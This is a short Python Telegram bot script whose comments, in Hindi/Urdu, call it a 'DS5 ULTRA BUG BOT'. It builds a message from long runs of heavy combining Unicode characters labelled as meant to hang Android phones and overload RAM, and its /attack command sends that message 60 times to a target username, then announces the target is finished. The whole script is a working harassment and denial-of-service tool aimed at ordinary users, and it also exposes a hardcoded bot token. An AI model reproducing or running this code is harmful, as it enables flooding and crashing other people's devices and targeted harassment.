import telebot
import time

# --- APKA TOKEN ---
TOKEN = 8506734114:AAHworAWrvu-aUVnso0qVsva91bn14y9ohw
bot = telebot.TeleBot(TOKEN)

# ☣️ ULTRA MAX CRASH BUG (Dunya ka sab se heavy) ☣️
ULTRA_BUG = (
    "🔱 **DS5 OMEGA CRASH** 🔱\n" +
    ("జ్ఞా" * 800) + # Android Hang
    ("ด็" * 600) + # Screen Lag
    (" ҉ " * 600) + # Glitch
    ("ဪ" * 600) + # RAM Overload
    ("\n🔥 **SYSTEM DEAD BY DS5** 🔥" * 5)
)

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🦠 **DS5 ULTRA BUG BOT ACTIVE** 🦠\n\nAb hoga asli tamasha! \n\nCommand: `/attack @username`", parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack(message):
    msg_text = message.text.split()
    if len(msg_text) < 2:
        bot.reply_to(message, "⚠️ Target ka username dalo!")
        return

    target = msg_text[1]
    bot.reply_to(message, f"💣 **Launching Atomic Bug at {target}...**")

    for i in range(60): # 60 Heavy Packets!
        try:
            bot.send_message(target, ULTRA_BUG)
            time.sleep(0.4) 
        except:
            break
    bot.send_message(message.chat.id, f"✅ **{target} ka kaam tamam!** 🤣")

bot.polling()
